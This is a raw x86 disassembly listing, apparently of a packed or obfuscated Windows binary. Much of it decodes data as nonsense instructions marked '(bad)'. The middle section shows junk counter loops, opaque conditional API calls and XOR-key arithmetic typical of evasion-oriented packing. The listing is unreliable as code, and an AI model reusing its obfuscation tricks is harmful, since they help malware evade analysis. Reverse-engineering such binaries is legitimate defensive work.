  40c71f:	xchg   ebp,esi
  40c721:	fndisi(8087 only) 
  40c723:	sub    eax,DWORD PTR [ecx-0x77]
  40c726:	push   es
  40c727:	out    dx,al
  40c728:	fistp  WORD PTR [edi]
  40c72a:	xor    BYTE PTR [ebp-0x6bd9b506],bh
  40c730:	idiv   BYTE PTR [ecx+edx*4-0xf]
  40c734:	add    al,0xc7
  40c736:	pop    es
  40c737:	stc    
  40c738:	inc    edi
  40c739:	imul   esp,DWORD PTR [esp+edx*4],0xffffffac
  40c73d:	add    bh,BYTE PTR [eax+0x260a702]
  40c743:	jb     0x40c707
  40c745:	cli    
  40c746:	enter  0x3893,0x99
  40c74a:	jmp    0x12b3e32b
  40c74f:	xor    DWORD PTR [eax+0x34040b61],edx
  40c755:	ret    0x8778
  40c758:	pushf  
  40c759:	xchg   ebx,eax
  40c75a:	xchg   ecx,eax
  40c75b:	cmp    al,0xbe
  40c75d:	jno    0x40c745
  40c75f:	(bad)  
  40c760:	and    DWORD PTR [ecx-0x205a3671],ebx
  40c766:	popa   
  40c767:	jbe    0x40c784
  40c769:	jae    0x40c713
  40c76b:	(bad)  
  40c76d:	xor    BYTE PTR [ebx],al
  40c76f:	sti    
  40c770:	sub    eax,0x6e73fb88
  40c775:	ret    
  40c776:	mov    dh,0xa4
  40c778:	and    al,0x8e
  40c77a:	inc    esi
  40c77b:	in     eax,0x14
  40c77d:	pop    esi
  40c77e:	lock cmp al,0xa3
  40c781:	push   ss
  40c782:	mov    eax,0x81912a96
  40c787:	push   ebp
  40c788:	rcr    DWORD PTR [edx+0x7eef9d87],1
  40c78e:	ret    0x4e5e
  40c791:	test   BYTE PTR [eax],0xbe
  40c794:	sub    DWORD PTR [esi],eax
  40c796:	xchg   ebx,edi
  40c798:	jno    0x40c791
  40c79a:	nop
  40c79b:	cli    
  40c79c:	mov    eax,ds:0x5d837fca
  40c7a1:	aad    0xef
  40c7a3:	into   
  40c7a4:	mov    bl,0x3f
  40c7a6:	push   0x13d43de0
  40c7ab:	int    0x32
  40c7ad:	daa    
  40c7ae:	mov    cl,ch
  40c7b0:	and    DWORD PTR [esi-0x11be9b14],esp
  40c7b6:	cli    
  40c7b7:	arpl   WORD PTR [esi],cx
  40c7b9:	aas    
  40c7ba:	fisubr DWORD PTR [ebx-0x5dfa6c26]
  40c7c0:	imul   ecx,ecx,0xffffffc8
  40c7c3:	lock mov cl,0xe0
  40c7c6:	xchg   ebx,eax
  40c7c7:	cmp    al,0x80
  40c7c9:	ficom  DWORD PTR [edx]
  40c7cb:	icebp  
  40c7cc:	mov    eax,0xb8585b53
  40c7d1:	mov    WORD PTR [eax+eiz*4],es
  40c7d4:	sbb    al,0xe
  40c7d6:	jl     0x40c7ed
  40c7d8:	outs   dx,BYTE PTR ds:[esi]
  40c7d9:	iret   
  40c7da:	retf   0xb6a7
  40c7dd:	popa   
  40c7de:	mov    dh,0x72
  40c7e0:	(bad)  
  40c7e2:	sub    DWORD PTR [ebp+0x453835ec],esi
  40c7e8:	push   ebx
  40c7e9:	ret    
  40c7ea:	aad    0xc9
  40c7ec:	add    eax,0x13e25028
  40c7f1:	pop    ds
  40c7f2:	or     BYTE PTR [edi-0x65c802b3],0xc1
  40c7f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7fa:	push   ds
  40c7fb:	scas   al,BYTE PTR es:[edi]
  40c7fc:	aam    0x7c
  40c7fe:	add    DWORD PTR [ecx-0xe93932a],esp
  40c804:	clc    
  40c805:	scas   eax,DWORD PTR es:[edi]
  40c806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c807:	daa    
  40c808:	sbb    al,0xcc
  40c80a:	xchg   esi,eax
  40c80b:	sub    eax,0xe139c61a
  40c810:	ds mov ah,0xe9
  40c813:	test   al,0x67
  40c815:	imul   ecx,DWORD PTR [ebx+0x2bc126ae],0xaa19227c
  40c81f:	jge    0x40c7e4
  40c821:	cli    
  40c822:	dec    esi
  40c823:	stc    
  40c824:	aam    0x9e
  40c826:	mov    ds:0x20a3a33a,eax
  40c82b:	mov    ecx,0x6fd2c0c7
  40c830:	mov    bh,0xea
  40c832:	xchg   esi,eax
  40c833:	cli    
  40c834:	jnp    0x40c858
  40c836:	pusha  
  40c837:	pop    ecx
  40c838:	loope  0x40c80b
  40c83a:	pop    esp
  40c83b:	test   DWORD PTR [esi],ebx
  40c83d:	je     0x40c842
  40c83f:	pop    ds
  40c840:	enter  0x6824,0x45
  40c844:	jmp    0xca231a0f
  40c849:	add    eax,0xdaf03660
  40c84e:	mov    esp,0xb002e385
  40c853:	jbe    0x40c7d9
  40c855:	enter  0x7d80,0x58
  40c859:	sbb    eax,0xde454b0f
  40c85e:	mov    es,WORD PTR [ebp+0x30]
  40c861:	fld    TBYTE PTR [esi]
  40c863:	push   esp
  40c864:	lods   al,BYTE PTR ds:[esi]
  40c865:	pop    esp
  40c866:	cmp    BYTE PTR [eax],bh
  40c868:	mov    dh,0x10
  40c86a:	inc    edx
  40c86b:	mov    fs,WORD PTR [ecx]
  40c86d:	js     0x40c8cc
  40c86f:	adc    eax,0x3e8e443c
  40c874:	jae    0x40c7ff
  40c876:	je     0x40c820
  40c878:	fild   WORD PTR [ebx]
  40c87a:	fs into 
  40c87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c87d:	data16 sti 
  40c87f:	mov    ah,0x7c
  40c881:	cwde   
  40c882:	pop    ebx
  40c883:	imul   esi,DWORD PTR [edi-0x3f],0xffffffed
  40c887:	iret   
  40c888:	dec    ebp
  40c889:	std    
  40c88a:	push   edi
  40c88b:	add    al,0xa4
  40c88d:	pop    eax
  40c88e:	das    
  40c88f:	or     bh,ah
  40c891:	sbb    BYTE PTR [edi-0x2a],ah
  40c894:	popa   
  40c895:	jmp    0x93a4:0x5253431b
  40c89c:	mov    ds:0x31dee41b,al
  40c8a1:	add    al,0xfb
  40c8a3:	sub    DWORD PTR [edi+0x2e],esp
  40c8a6:	pop    ecx
  40c8a7:	sub    eax,0x91b66aea
  40c8ac:	adc    DWORD PTR [edi+0x78ac2ba5],ebp
  40c8b2:	in     eax,0xf0
  40c8b4:	cmp    esi,ebp
  40c8b6:	iret   
  40c8b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8b8:	(bad)  
  40c8b9:	int    0x40
  40c8bb:	icebp  
  40c8bc:	add    BYTE PTR [edx+0x7894e8b5],cl
  40c8c2:	adc    eax,DWORD PTR [ecx]
  40c8c4:	pop    ecx
  40c8c5:	(bad)  
  40c8c6:	mov    cl,0x10
  40c8c8:	inc    eax
  40c8c9:	mov    DWORD PTR [edx-0x57a617e],0x6ec72c2d
  40c8d3:	outs   dx,BYTE PTR ds:[esi]
  40c8d4:	push   edx
  40c8d5:	xchg   esp,eax
  40c8d6:	mov    al,cl
  40c8d8:	inc    ebp
  40c8d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8da:	add    al,0x60
  40c8dc:	ficom  WORD PTR [eax+0xd]
  40c8df:	mov    ah,0xcc
  40c8e1:	addr16 nop
  40c8e3:	or     DWORD PTR [esi-0x4e6e1bd4],esp
  40c8e9:	pop    ebx
  40c8ea:	lods   al,BYTE PTR ds:[esi]
  40c8eb:	mov    ch,0x83
  40c8ed:	scas   al,BYTE PTR es:[edi]
  40c8ee:	out    0x34,eax
  40c8f0:	dec    esi
  40c8f1:	pop    ebp
  40c8f2:	xchg   esi,eax
  40c8f3:	ret    0x7b5b
  40c8f6:	ret    0x98f8
  40c8f9:	outs   dx,BYTE PTR ds:[esi]
  40c8fa:	jge    0x40c95e
  40c8fc:	(bad)  
  40c8fe:	inc    ecx
  40c8ff:	std    
  40c900:	outs   dx,DWORD PTR ds:[esi]
  40c901:	xor    bl,BYTE PTR [esi-0x7b]
  40c904:	and    eax,0xea03356b
  40c909:	jns    0x40c936
  40c90b:	jge    0x40c982
  40c90d:	outs   dx,BYTE PTR ds:[esi]
  40c90e:	mov    ebx,0xffdb91d9
  40c913:	sub    cl,BYTE PTR [esi-0x57]
  40c916:	rol    DWORD PTR [ecx+0x35],0xdd
  40c91a:	push   0x3bdd867d
  40c91f:	fdiv   st,st(6)
  40c921:	inc    esi
  40c922:	fldenv [eax]
  40c924:	sub    BYTE PTR [ecx],cl
  40c926:	jb     0x40c903
  40c928:	in     eax,0xa1
  40c92a:	mov    edx,0x31c18d27
  40c92f:	mov    ds,edx
  40c931:	dec    ebp
  40c932:	add    eax,ecx
  40c934:	imul   esi,DWORD PTR es:[esi+ecx*4],0x70
  40c939:	rcl    cl,cl
  40c93b:	jmp    0x8681:0x1a80db64
  40c942:	fdiv   DWORD PTR [ebx-0x7d]
  40c945:	inc    ebx
  40c946:	leave  
  40c947:	pop    edx
  40c948:	xor    al,0x11
  40c94a:	(bad)  
  40c94b:	int3   
  40c94c:	lods   al,BYTE PTR ds:[esi]
  40c94d:	loope  0x40c957
  40c94f:	outs   dx,DWORD PTR ds:[esi]
  40c950:	sbb    BYTE PTR [ebx+ecx*4+0x2b771512],al
  40c957:	and    BYTE PTR [edi+0x9],bl
  40c95a:	mov    eax,0x5a59e312
  40c95f:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40c966:	xor    DWORD PTR ds:0x413d34,0x2984
  40c970:	mov    ecx,DWORD PTR [ebp-0x14]
  40c973:	and    DWORD PTR ds:0x413d24,0x0
  40c97d:	jmp    0x40c990
  40c982:	xor    eax,eax
  40c984:	or     eax,DWORD PTR ds:0x413d24
  40c98a:	inc    eax
  40c98b:	mov    ds:0x413d24,eax
  40c990:	cmp    DWORD PTR ds:0x413d24,0x18
  40c997:	jae    0x40ca0e
  40c99d:	cmp    DWORD PTR ds:0x413d24,0x20
  40c9a4:	jne    0x40c9bd
  40c9aa:	push   0x738d
  40c9af:	push   0x6edb
  40c9b4:	push   DWORD PTR [ebp-0x18]
  40c9b7:	call   DWORD PTR ds:0x416768
  40c9bd:	jmp    0x40c982
  40c9c2:	mov    DWORD PTR ds:0x413c1e,0x1e
  40c9cc:	cmp    DWORD PTR ds:0x413c1e,0x0
  40c9d3:	je     0x40ca0e
  40c9d9:	cmp    DWORD PTR ds:0x413c1e,0x2c
  40c9e0:	jne    0x40c9fe
  40c9e6:	push   0x25a0
  40c9eb:	push   0x413ce4
  40c9f0:	push   0x3cd5
  40c9f5:	push   DWORD PTR [ebp-0x18]
  40c9f8:	call   DWORD PTR ds:0x416770
  40c9fe:	mov    eax,ds:0x413c1e
  40ca03:	dec    eax
  40ca04:	mov    ds:0x413c1e,eax
  40ca09:	jmp    0x40c9cc
  40ca0e:	push   esi
  40ca0f:	sbb    DWORD PTR ds:0x413ce4,0x7973
  40ca19:	mov    eax,0x7510894
  40ca1e:	and    DWORD PTR ds:0x413c1e,0x0
  40ca28:	jmp    0x40ca3a
  40ca2d:	mov    esi,DWORD PTR ds:0x413c1e
  40ca33:	inc    esi
  40ca34:	mov    DWORD PTR ds:0x413c1e,esi
  40ca3a:	cmp    DWORD PTR ds:0x413c1e,0x15
  40ca41:	jae    0x40ca74
  40ca47:	cmp    DWORD PTR ds:0x413c1e,0x1f
  40ca4e:	jne    0x40ca6e
  40ca54:	push   0x413c12
  40ca59:	push   0x88a1
  40ca5e:	push   0x416000
  40ca63:	push   0x416152
  40ca68:	call   DWORD PTR ds:0x416774
  40ca6e:	jmp    0x40ca2d
  40ca73:	inc    esi
  40ca74:	xor    ecx,eax
  40ca76:	sub    esi,DWORD PTR ds:0x413c70
  40ca7c:	mov    esi,0x3272dc
  40ca81:	mov    DWORD PTR ds:0x413c80,0x12bb
  40ca8b:	push   edi
  40ca8c:	xor    DWORD PTR ds:0x413ce4,0x413c6c
  40ca96:	add    ecx,esi
  40ca98:	jmp    0x40cab4
  40ca9d:	mov    dl,BYTE PTR [ebp-0x1]
  40caa0:	not    DWORD PTR ds:0x41400c
  40caa6:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40caad:	not    DWORD PTR ds:0x413ce8
  40cab3:	inc    ecx
  40cab4:	cmp    ecx,0x40
  40cab7:	mov    DWORD PTR ds:0x413d24,0x3f58
  40cac1:	jb     0x40ca9d
  40cac7:	adc    edx,0x503d
  40cacd:	mov    edx,DWORD PTR [ebp-0x14]
  40cad0:	xor    edx,eax
  40cad2:	add    edx,esi
  40cad4:	jmp    0x40cc01
  40cad9:	and    DWORD PTR ds:0x413c0a,0x1a66
  40cae3:	mov    edi,DWORD PTR [ebp+0x8]
  40cae6:	and    ecx,0xcf4
  40caec:	mov    ecx,0x8a87
  40caf1:	adc    DWORD PTR ds:0x413c12,0x413d
  40cafb:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40cb00:	and    DWORD PTR ds:0x41401c,0x0
  40cb0a:	mov    edi,DWORD PTR ds:0x41401c
  40cb10:	inc    edi
  40cb11:	mov    DWORD PTR ds:0x41401c,edi
  40cb17:	cmp    DWORD PTR ds:0x41401c,0x5
  40cb1e:	jne    0x40cb39
  40cb24:	push   0x6acf
  40cb29:	push   0x413cf4
  40cb2e:	push   0x416152
  40cb33:	call   DWORD PTR ds:0x416778
  40cb39:	cmp    DWORD PTR ds:0x41401c,0x4
  40cb40:	jne    0x40cb53
  40cb46:	mov    edi,DWORD PTR ds:0x41401c
  40cb4c:	inc    edi
  40cb4d:	mov    DWORD PTR ds:0x41401c,edi
  40cb53:	cmp    DWORD PTR ds:0x41401c,0x1b
  40cb5a:	jb     0x40cb0a
  40cb60:	mov    DWORD PTR ds:0x414018,0x15
  40cb6a:	cmp    DWORD PTR ds:0x414018,0x0
  40cb71:	je     0x40cbab
  40cb77:	cmp    DWORD PTR ds:0x414018,0x1b
  40cb7e:	jne    0x40cb8f
  40cb84:	push   0x4160b3
  40cb89:	call   DWORD PTR ds:0x41677c
  40cb8f:	mov    edi,DWORD PTR ds:0x414018
  40cb95:	dec    edi
  40cb96:	mov    DWORD PTR ds:0x414018,edi
  40cb9c:	jmp    0x40cb6a
  40cba1:	xor    DWORD PTR ds:0x414008,0x3196
  40cbab:	mov    edi,0x3b4a
  40cbb0:	add    cx,di
  40cbb3:	sbb    DWORD PTR ds:0x414000,0x24d3
  40cbbd:	movzx  ecx,cx
  40cbc0:	xor    DWORD PTR ds:0x413bfe,0x413c06
  40cbca:	mov    DWORD PTR [ebp-0x10],ecx
  40cbcd:	neg    DWORD PTR ds:0x413c0e
  40cbd3:	mov    ecx,DWORD PTR [ebp+0x8]
  40cbd6:	or     DWORD PTR ds:0x413d20,0x3470
  40cbe0:	movzx  ecx,WORD PTR [ecx+edx*4]
  40cbe4:	xor    DWORD PTR ds:0x413d30,0x413bf6
  40cbee:	xor    ecx,0x8a87
  40cbf4:	add    ecx,edi
  40cbf6:	mov    edi,DWORD PTR [ebp-0x10]
  40cbf9:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  40cc00:	inc    edx
  40cc01:	mov    ecx,DWORD PTR [ebp-0x18]
  40cc04:	cmp    edx,ecx
  40cc06:	mov    DWORD PTR ds:0x414010,0x5811
  40cc10:	jne    0x40cad9
  40cc16:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc19:	mov    DWORD PTR ds:0x413d1c,0x410a
  40cc23:	mov    edx,DWORD PTR [ebp+0x10]
  40cc26:	dec    DWORD PTR ds:0x413cec
  40cc2c:	xor    ecx,eax
  40cc2e:	add    ecx,esi
  40cc30:	and    DWORD PTR ds:0x413c0a,0x5ecf
  40cc3a:	mov    DWORD PTR [edx],ecx
  40cc3c:	dec    ecx
  40cc3d:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc40:	xor    ecx,eax
  40cc42:	and    DWORD PTR ds:0x413bf6,0x413c84
  40cc4c:	add    ecx,esi
  40cc4e:	mov    DWORD PTR ds:0x413c0a,0x45cc
  40cc58:	mov    DWORD PTR [ebp-0x20],ecx
  40cc5b:	not    ecx
  40cc5d:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  40cc64:	mov    DWORD PTR [ebp-0xc],0xf89c85a0
  40cc6b:	mov    DWORD PTR [ebp-0x1c],0xf89c95b0
  40cc72:	mov    DWORD PTR ds:0x413c6c,edi
  40cc78:	mov    ecx,DWORD PTR [ebp-0xc]
  40cc7b:	mov    DWORD PTR ds:0x413c84,0x129c
  40cc85:	mov    DWORD PTR [ebp+0x8],ecx
  40cc88:	jmp    0x40ce75
  40cc8d:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc90:	add    edx,DWORD PTR ds:0x413c80
  40cc96:	mov    edx,DWORD PTR [ebp-0x8]
  40cc99:	and    DWORD PTR ds:0x413c74,0x413d20
  40cca3:	xor    ecx,eax
  40cca5:	xor    edx,eax
  40cca7:	sub    ecx,edx
  40cca9:	sub    ecx,esi
  40ccab:	xor    ecx,eax
  40ccad:	and    DWORD PTR ds:0x413c1a,0x0
  40ccb7:	mov    edx,DWORD PTR ds:0x413c1a
  40ccbd:	inc    edx
  40ccbe:	mov    DWORD PTR ds:0x413c1a,edx
  40ccc4:	cmp    DWORD PTR ds:0x413c1a,0x9
  40cccb:	jne    0x40cce4
  40ccd1:	push   0x413bfe
  40ccd6:	push   DWORD PTR [ebp-0x20]
  40ccd9:	push   0x4160ed
  40ccde:	call   DWORD PTR ds:0x416780
  40cce4:	cmp    DWORD PTR ds:0x413c1a,0x8
  40cceb:	jne    0x40ccfe
  40ccf1:	mov    edx,DWORD PTR ds:0x413c1a
  40ccf7:	inc    edx
  40ccf8:	mov    DWORD PTR ds:0x413c1a,edx
  40ccfe:	cmp    DWORD PTR ds:0x413c1a,0x10
  40cd05:	jb     0x40ccb7
  40cd0b:	mov    DWORD PTR [ebp+0x8],ecx
  40cd0e:	adc    ecx,ecx
  40cd10:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd13:	mov    DWORD PTR ds:0x413c16,0x3405
  40cd1d:	mov    edx,DWORD PTR [ebp-0x64]
  40cd20:	lea    ecx,[edx+ecx*1+0x5708f1]
  40cd27:	mov    DWORD PTR [ebp-0x64],ecx
  40cd2a:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd2d:	mov    edx,DWORD PTR [ebp-0x60]
  40cd30:	lea    ecx,[edx+ecx*1+0x5708f1]
  40cd37:	movzx  edx,WORD PTR ds:0x413d20
  40cd3e:	sbb    edx,DWORD PTR ds:0x413d28
  40cd44:	mov    DWORD PTR ds:0x413d20,edx
  40cd4a:	mov    DWORD PTR [ebp-0x60],ecx
  40cd4d:	and    DWORD PTR ds:0x414000,0x413d1c
  40cd57:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd5a:	add    DWORD PTR ds:0x413c78,ebx
  40cd60:	mov    edx,DWORD PTR [ebp-0x5c]
  40cd63:	neg    DWORD PTR ds:0x413c02
  40cd69:	lea    ecx,[edx+ecx*1+0x5708f2]
  40cd70:	and    DWORD PTR ds:0x413d20,0x0
  40cd7a:	mov    edx,DWORD PTR ds:0x413d20
  40cd80:	inc    edx
  40cd81:	mov    DWORD PTR ds:0x413d20,edx
  40cd87:	cmp    DWORD PTR ds:0x413d20,0xa
  40cd8e:	jne    0x40cda2
  40cd94:	push   0x413d34
  40cd99:	push   DWORD PTR [ebp-0x24]
  40cd9c:	call   DWORD PTR ds:0x416784
  40cda2:	cmp    DWORD PTR ds:0x413d20,0x9
  40cda9:	jne    0x40cdbe
  40cdaf:	xor    edx,edx
  40cdb1:	add    edx,DWORD PTR ds:0x413d20
  40cdb7:	inc    edx
  40cdb8:	mov    DWORD PTR ds:0x413d20,edx
  40cdbe:	cmp    DWORD PTR ds:0x413d20,0x15
  40cdc5:	jb     0x40cd7a
  40cdcb:	or     DWORD PTR ds:0x413ce8,0x2ce1
  40cdd5:	mov    DWORD PTR [ebp-0x5c],ecx
  40cdd8:	mov    ecx,DWORD PTR [ebp+0x8]
  40cddb:	add    DWORD PTR ds:0x413c1e,ecx
  40cde1:	mov    edx,DWORD PTR [ebp-0x58]
  40cde4:	lea    ecx,[edx+ecx*1+0x5708f3]
  40cdeb:	add    DWORD PTR ds:0x413bfe,ebx
  40cdf1:	mov    DWORD PTR [ebp-0x58],ecx
  40cdf4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cdf7:	or     DWORD PTR ds:0x413c80,0x1524
  40ce01:	mov    edx,DWORD PTR [ebp-0x54]
  40ce04:	lea    ecx,[edx+ecx*1+0x5708fc]
  40ce0b:	adc    edx,DWORD PTR ds:0x41400c
  40ce11:	mov    DWORD PTR [ebp-0x54],ecx
  40ce14:	and    DWORD PTR ds:0x413d20,0x0
  40ce1e:	mov    edx,DWORD PTR ds:0x413d20
  40ce24:	inc    edx
  40ce25:	mov    DWORD PTR ds:0x413d20,edx
  40ce2b:	cmp    DWORD PTR ds:0x413d20,0x12
  40ce32:	jne    0x40ce48
  40ce38:	push   0x8060
  40ce3d:	push   0x41608d
  40ce42:	call   DWORD PTR ds:0x41678c
  40ce48:	cmp    DWORD PTR ds:0x413d20,0x10
  40ce4f:	jb     0x40ce1e
  40ce55:	mov    ecx,DWORD PTR [ebp+0x8]
  40ce58:	sbb    edx,DWORD PTR ds:0x413c0e
  40ce5e:	mov    edx,DWORD PTR [ebp-0x50]
  40ce61:	sbb    DWORD PTR ds:0x413cf4,0x413c16
  40ce6b:	lea    ecx,[edx+ecx*1+0x5708fd]
  40ce72:	mov    DWORD PTR [ebp-0x50],ecx
  40ce75:	and    DWORD PTR ds:0x413c12,0x0
  40ce7f:	mov    ecx,DWORD PTR ds:0x413c12
  40ce85:	inc    ecx
  40ce86:	mov    DWORD PTR ds:0x413c12,ecx
  40ce8c:	cmp    DWORD PTR ds:0x413c12,0x1d
  40ce93:	jne    0x40ceb7
  40ce99:	push   DWORD PTR [ebp-0x20]
  40ce9c:	push   0x413c70
  40cea1:	push   0x4dec
  40cea6:	push   0x4160bf
  40ceab:	push   DWORD PTR [ebp-0x20]
  40ceae:	push   DWORD PTR [ebp-0x10]
  40ceb1:	call   DWORD PTR ds:0x416790
  40ceb7:	cmp    DWORD PTR ds:0x413c12,0x11
  40cebe:	jb     0x40ce7f
  40cec4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cec7:	xor    ecx,eax
  40cec9:	add    ecx,esi
  40cecb:	jne    0x40cc8d
  40ced1:	jmp    0x40f43d
  40ced6:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ced9:	mov    edx,DWORD PTR [ebp-0x8]
  40cedc:	xor    ecx,eax
  40cede:	xor    edx,eax
  40cee0:	sub    ecx,edx
  40cee2:	sub    ecx,esi
  40cee4:	xor    ecx,eax
  40cee6:	mov    DWORD PTR [ebp-0x1c],ecx
  40cee9:	mov    ecx,DWORD PTR [ebp-0xc]
  40ceec:	mov    DWORD PTR [ebp+0x8],ecx
  40ceef:	jmp    0x40cf21
  40cef4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cef7:	mov    edx,DWORD PTR [ebp-0x8]
  40cefa:	xor    ecx,eax
  40cefc:	xor    edx,eax
  40cefe:	sub    ecx,edx
  40cf00:	sub    ecx,esi
  40cf02:	xor    ecx,eax
  40cf04:	mov    DWORD PTR [ebp+0x8],ecx
  40cf07:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf0a:	mov    edx,DWORD PTR [ebp+0x8]
  40cf0d:	imul   edx,edx,0x5708f1
  40cf13:	xor    ecx,eax
  40cf15:	add    ecx,esi
  40cf17:	lea    ecx,[ebp+ecx*4-0x64]
  40cf1b:	mov    edi,DWORD PTR [ecx]
  40cf1d:	add    edx,edi
  40cf1f:	mov    DWORD PTR [ecx],edx
  40cf21:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf24:	xor    ecx,eax
  40cf26:	add    ecx,esi
  40cf28:	jne    0x40cef4
  40cf2e:	mov    ecx,DWORD PTR [ebp-0x20]
  40cf31:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40cf38:	mov    dl,BYTE PTR [ebp-0x1]
  40cf3b:	cmp    cl,dl
  40cf3d:	je     0x40f39e
  40cf43:	mov    ecx,DWORD PTR [ebp-0x20]
  40cf46:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40cf4d:	mov    edx,DWORD PTR [ebp+0xc]
  40cf50:	cmp    cl,BYTE PTR [edx]
  40cf52:	jne    0x40f44f
  40cf58:	mov    ecx,DWORD PTR [ebp-0x14]
  40cf5b:	mov    edx,DWORD PTR [ebp+0xc]
  40cf5e:	movsx  edx,BYTE PTR [edx]
  40cf61:	xor    ecx,eax
  40cf63:	add    ecx,esi
  40cf65:	cmp    edx,ecx
  40cf67:	mov    ecx,DWORD PTR [ebp-0xc]
  40cf6a:	mov    DWORD PTR [ebp+0x8],ecx
  40cf6d:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf70:	je     0x411851
  40cf76:	jmp    0x40cfab
  40cf7b:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf7e:	mov    edx,DWORD PTR [ebp-0x8]
  40cf81:	xor    ecx,eax
  40cf83:	xor    edx,eax
  40cf85:	sub    ecx,edx
  40cf87:	sub    ecx,esi
  40cf89:	xor    ecx,eax
  40cf8b:	mov    DWORD PTR [ebp+0x8],ecx
  40cf8e:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf91:	mov    edx,DWORD PTR [ebp+0x8]
  40cf94:	xor    ecx,eax
  40cf96:	imul   edx,edx,0x5708f1
  40cf9c:	add    ecx,esi
  40cf9e:	lea    ecx,[ebp+ecx*4-0x64]
  40cfa2:	mov    edi,DWORD PTR [ecx]
  40cfa4:	add    edx,edi
  40cfa6:	mov    DWORD PTR [ecx],edx
  40cfa8:	mov    ecx,DWORD PTR [ebp+0x8]
  40cfab:	xor    ecx,eax
  40cfad:	add    ecx,esi
  40cfaf:	jne    0x40cf7b
  40cfb5:	mov    ecx,DWORD PTR [ebp-0x14]
  40cfb8:	mov    edx,DWORD PTR [ebp+0x8]
  40cfbb:	xor    ecx,eax
  40cfbd:	xor    edx,eax
  40cfbf:	add    ecx,esi
  40cfc1:	add    edx,esi
  40cfc3:	cmp    ecx,edx
  40cfc5:	jae    0x40f3e3
  40cfcb:	lea    edx,[ecx-0x3272dc]
  40cfd1:	mov    DWORD PTR [ebp-0x18],edx
  40cfd4:	mov    edi,DWORD PTR [ebp-0x18]
  40cfd7:	mov    DWORD PTR [ebp-0x24],0x705fd0e
  40cfde:	lea    edx,[ebp-0x24]
  40cfe1:	mov    DWORD PTR [ebp-0x10],edx
  40cfe4:	mov    edx,DWORD PTR [ebp-0x10]
  40cfe7:	add    DWORD PTR [edx],0x705fa0e
  40cfed:	mov    ebx,DWORD PTR [ebp-0x10]
  40cff0:	xor    edi,eax
  40cff2:	add    edi,DWORD PTR [ebx]
  40cff4:	lea    edx,[ebp+ecx*4-0x64]
  40cff8:	jmp    0x40f380
  40cffd:	sar    BYTE PTR [ebx-0x74043cf0],1
  40d003:	jae    0x40cfc0
  40d005:	dec    ebp
  40d006:	bound  esi,QWORD PTR [eax+0x3be8e95d]
  40d00c:	inc    eax
  40d00d:	mov    dl,0xe9
  40d00f:	jl     0x40d08d
  40d011:	pop    es
  40d012:	pop    edi
  40d013:	jl     0x40d091
  40d015:	add    ch,bl
  40d017:	or     DWORD PTR [ecx-0x1f311cbd],ebx
  40d01d:	popf   
  40d01e:	and    BYTE PTR [edx+0x75],0xa0
  40d022:	dec    esp
  40d023:	cdq    
  40d024:	retf   
  40d025:	sub    DWORD PTR [esi+esi*8-0x1c7ea379],ebx
  40d02c:	jnp    0x40d05f
  40d02e:	inc    edi
  40d02f:	loope  0x40cfba
  40d031:	call   0x1389833f
  40d036:	sbb    dh,BYTE PTR [ecx+0x31227fd9]
  40d03c:	add    BYTE PTR [edx-0x25],bl
  40d03f:	push   ss
  40d040:	pop    ds
  40d041:	dec    edx
  40d042:	sub    DWORD PTR [esi-0x4],ebp
  40d045:	stos   DWORD PTR es:[edi],eax
  40d046:	jge    0x40d06e
  40d048:	sar    BYTE PTR [ebp+edi*1+0x2f19a08f],cl
  40d04f:	xchg   edi,eax
  40d050:	(bad)  
  40d051:	and    cl,dh
  40d053:	push   esp
  40d054:	fadd   st(5),st
  40d056:	xchg   esp,eax
  40d057:	xlat   BYTE PTR ds:[ebx]
  40d058:	xor    BYTE PTR [esi-0x717d63ee],0xfe
  40d05f:	dec    ebp
  40d060:	pop    edi
  40d061:	inc    eax
  40d062:	push   ebx
  40d063:	imul   esp,DWORD PTR [ecx],0xffffffae
  40d066:	adc    DWORD PTR [edx-0x29ba6f97],0xffffffb0
  40d06d:	std    
  40d06e:	enter  0xf5eb,0xe7
  40d072:	and    eax,0x51487219
  40d077:	nop
  40d078:	mov    cl,0x73
  40d07a:	sub    ebx,DWORD PTR [eax+0x29c93c6f]
  40d080:	mov    edi,0xc2520bda
  40d085:	(bad)  
  40d086:	adc    DWORD PTR [ebx+0x3],ebx
  40d089:	jmp    0x40d0aa
  40d08b:	test   DWORD PTR [eax],ecx
  40d08d:	fdivr  DWORD PTR [ebx-0x592002df]
  40d093:	or     DWORD PTR [ecx+ebx*1+0x44d8484d],0x5e
  40d09b:	dec    ecx
  40d09c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d09d:	leave  
  40d09e:	jb     0x40d0e6
  40d0a0:	std    
  40d0a1:	cld    
  40d0a2:	xor    DWORD PTR [esi-0x45],ebx
  40d0a5:	ffree  st(6)
  40d0a7:	aam    0xc9
  40d0a9:	cdq    
  40d0aa:	ret    
  40d0ab:	ret    
  40d0ac:	xchg   BYTE PTR [edx-0x2bb6be73],cl
  40d0b2:	mov    esi,0x4c16124e
  40d0b7:	xor    bh,BYTE PTR [ebx]
  40d0b9:	cmp    eax,0x6eeda42
  40d0be:	(bad)  
  40d0bf:	lock pop eax
